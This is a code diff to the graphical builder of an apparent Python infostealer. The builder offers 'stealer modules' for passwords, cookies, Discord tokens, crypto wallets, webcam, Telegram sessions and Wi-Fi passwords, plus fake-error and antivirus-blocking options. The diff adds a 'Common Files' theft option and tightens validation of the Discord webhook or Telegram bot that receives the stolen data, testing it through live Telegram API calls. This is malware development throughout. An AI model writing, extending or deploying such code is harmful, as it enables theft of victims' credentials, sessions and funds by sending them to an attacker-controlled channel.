@@ -14,6 +14,7 @@ from pkg_resources import parse_version
 from socket import create_connection
 from tkinter import messagebox
 from urllib.request import urlopen, Request
+from urllib.error import HTTPError
 from urllib.parse import quote
 from PIL import Image
 from io import BytesIO
@@ -156,6 +157,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureSystemInfoVar = ctk.BooleanVar(self)
 		self.captureScreenshotVar = ctk.BooleanVar(self)
 		self.captureTelegramVar = ctk.BooleanVar(self)
+		self.captureCommonFilesVar = ctk.BooleanVar(self)
 		self.captureWalletsVar = ctk.BooleanVar(self)
 		self.fakeErrorVar = ctk.BooleanVar(self)
 		self.blockAvSitesVar = ctk.BooleanVar(self)
@@ -226,6 +228,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		self.captureTelegramChecboxControl = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureTelegramVar)
 		self.captureTelegramChecboxControl.grid(row= 3, column= 3, sticky= "w", padx= 20)
+
+		self.captureCommonFilesChecboxControl = ctk.CTkCheckBox(self, text= "Common Files", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", text_color_disabled= "grey", variable= self.captureCommonFilesVar)
+		self.captureCommonFilesChecboxControl.grid(row= 4, column= 3, sticky= "w", padx= 20)
 
 		self.fakeErrorCheckboxControl = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", text_color_disabled= "grey", command= self.fakeError_Event, variable= self.fakeErrorVar)
 		self.fakeErrorCheckboxControl.grid(row= 1, column= 4, sticky= "w", padx= 20)
@@ -387,31 +392,51 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				messagebox.showerror("Error", "Webhook cannot be empty!")
 				return
 			
-			if not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
-				messagebox.showerror("Error", "Invalid webhook!")
+			if any(char.isspace() for char in webhook):
+				messagebox.showerror("Error", "Webhook cannot contain spaces!")
+				return
+			
+			if not webhook.startswith(("http://", "https://")):
+				messagebox.showerror("Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
 				return
 		
 		elif self.C2Mode == 1:
 			endpoint = self.C2EntryControl.get().strip()
 			if len(endpoint) == 0:
-				messagebox.showerror("Error", "Endpoint cannot be empty!")
+					messagebox.showerror("Error", "Endpoint cannot be empty!")
+					return
+
+			if any(char.isspace() for char in endpoint):
+				messagebox.showerror("Error", "Endpoint cannot contain spaces!")
 				return
 			
-			if not endpoint.count("$") == 1 or any(char.isspace() for char in endpoint):
-				messagebox.showerror("Error", "Invalid endpoint!")
+			if any(char in ("[", "]") for char in endpoint):
+				messagebox.showerror("Error", "You do not have to include the brackets in the endpoint!")
+				return
+
+			if not endpoint.count("$") == 1:
+				messagebox.showerror("Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
 				return
 			
 			token, chat_id = [i.strip() for i in endpoint.split("$")]
 
-			if not token or not chat_id:
-				messagebox.showerror("Warning", "Invalid endpoint!")
+			if not token:
+				messagebox.showerror("Error", "Bot token cannot be empty!")
+				return
+			
+			if chat_id:
+				if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
+					messagebox.showerror("Error", "Invalid chat ID! Chat ID must be a number.")
+					return
+			else:
+				messagebox.showerror("Error", "Chat ID cannot be empty!")
 				return
 		
 		if not Utility.CheckInternetConnection():
 			messagebox.showwarning("Warning", "Unable to connect to the internet!")
 			return
 		
-		if not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureGamesVar.get() or self.captureWalletsVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get() or self.captureTelegramVar.get()):
+		if not (self.captureWebcamVar.get() or self.capturePasswordsVar.get() or self.captureCookiesVar.get() or self.captureHistoryVar.get() or self.captureDiscordTokensVar.get() or self.captureGamesVar.get() or self.captureWalletsVar.get() or self.captureWifiPasswordsVar.get() or self.captureSystemInfoVar.get() or self.captureScreenshotVar.get() or self.captureTelegramVar.get() or self.captureCommonFilesVar):
 			messagebox.showwarning("Warning", "You must select at least one of the stealer modules!")
 			return
 		
@@ -438,6 +463,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         		"captureSystemInfo" : self.captureSystemInfoVar.get(),
         		"captureScreenshot" : self.captureScreenshotVar.get(),
         		"captureTelegramSession" : self.captureTelegramVar.get(),
+				"captureCommonFiles" : self.captureCommonFilesVar.get(),
 				"captureWallets" : self.captureWalletsVar.get(),
 
         		"fakeError" : self.fakeErrorData,
@@ -465,8 +491,12 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 					messagebox.showerror("Error", "Webhook cannot be empty!")
 					return
 				
-				if not webhook.startswith(("http://", "https://")) or any(char.isspace() for char in webhook):
-					messagebox.showerror("Error", "Invalid webhook!")
+				if any(char.isspace() for char in webhook):
+					messagebox.showerror("Error", "Webhook cannot contain spaces!")
+					return
+				
+				if not webhook.startswith(("http://", "https://")):
+					messagebox.showerror("Error", "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
 					return
 				
 				elif not "discord" in webhook:
@@ -486,24 +516,66 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 					if status == 204:
 						messagebox.showinfo("Success", "Your webhook seems to be working!")
 					else:
-						raise Exception()
+						messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
 				except Exception:
-					messagebox.showwarning("Warning", "Your webhook does not seems to be working!")
+					messagebox.showwarning("Warning", "Unable to connect to the webhook!")
 			
 			if self.C2Mode == 1:
 				endpoint = self.C2EntryControl.get().strip()
 				if len(endpoint) == 0:
 					messagebox.showerror("Error", "Endpoint cannot be empty!")
 					return
+
+				if any(char.isspace() for char in endpoint):
+					messagebox.showerror("Error", "Endpoint cannot contain spaces!")
+					return
 				
-				if not endpoint.count("$") == 1 or any(char.isspace() for char in endpoint):
-					messagebox.showerror("Error", "Invalid endpoint!")
+				if any(char in ("[", "]") for char in endpoint):
+					messagebox.showerror("Error", "You do not have to include the brackets in the endpoint!")
+					return
+
+				if not endpoint.count("$") == 1:
+					messagebox.showerror("Error", "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
 					return
 				
 				token, chat_id = [i.strip() for i in endpoint.split("$")]
 
-				if not token or not chat_id:
-					messagebox.showerror("Warning", "Invalid endpoint!")
+				if token:
+					try:
+						resp = json.loads(urlopen("https://api.telegram.org/bot%s/getUpdates" % token).read().decode())
+						if not resp["ok"]:
+							messagebox.showerror("Error", "Invalid bot token!")
+							return
+					except HTTPError as e:
+						if e.code == 401:
+							messagebox.showerror("Error", "Invalid bot token!")
+							return
+				else:
+					messagebox.showerror("Error", "Bot token cannot be empty!")
+					return
+				
+				if chat_id:
+					if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
+						messagebox.showerror("Error", "Invalid chat ID! Chat ID must be a number.")
+						return
+					else:
+						try:
+							resp = json.loads(urlopen("https://api.telegram.org/bot%s/getChat?chat_id=%s" % (token, chat_id)).read().decode())
+							if not resp["ok"]:
+								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
+								return
+							else:
+								if resp["result"].get("permissions"):
+									if not resp["result"]["permissions"]["can_send_documents"] or not resp["result"]["permissions"]["can_send_messages"]:
+										messagebox.showerror("Error", "The bot does not have the required permissions to send files and messages to the chat!")
+										return
+
+						except HTTPError as e:
+							if e.code in (400, 403):
+								messagebox.showerror("Error", "Invalid chat ID!\n\nCommon fixes:\n\n1) If the chat ID is of a user, then make sure the user have has sent at least one message to the bot.\n2) If the chat ID is of a channel, then make sure you have has sent at least one message in the channel after the bot joined.\n3) If the chat ID is of a group, then make sure the bot is a member of the group.")
+								return
+				else:
+					messagebox.showerror("Error", "Chat ID cannot be empty!")
 					return
 				
 				if not Utility.CheckInternetConnection():
@@ -514,8 +586,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 					if urlopen("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (token, chat_id, quote("Your endpoint is working!"))).status == 200:
 						messagebox.showinfo("Success", "Your endpoint seems to be working!")
 						return
-				except Exception:
-					messagebox.showwarning("Warning", "Your endpoint does not seems to be working!")
+				except Exception as e:
+					print(e)
+					messagebox.showwarning("Warning", "Unable to connect to the endpoint!")
 					return
 		
 		check()
